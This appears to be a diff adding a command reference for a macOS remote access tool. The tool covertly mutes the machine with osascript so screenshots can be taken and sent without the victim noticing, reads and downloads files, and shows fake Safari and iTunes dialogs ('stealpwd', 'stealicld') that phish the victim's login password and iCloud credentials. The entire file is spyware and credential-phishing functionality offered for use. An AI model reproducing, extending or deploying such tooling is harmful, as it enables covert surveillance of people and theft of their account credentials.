@@ -1,0 +1,18 @@
+# Set volume to zero before screenshot so there is no noise
+osascript -e "set Volume 0"
+
+# Takes a screenshot and sends it to you BEWARE: dont take a screenshot on the desktop the person will see it
+screenshot
+
+# Preview a file (only .txt or related files)
+cat
+
+# Dowload any file
+dowload
+
+# Creates a window that asks for ther persons code for the computer (makes it look like safari is asking for it ;)
+stealpwd
+
+# Same as before just asks for the icloud email and password "for itunes"
+stealicld
+
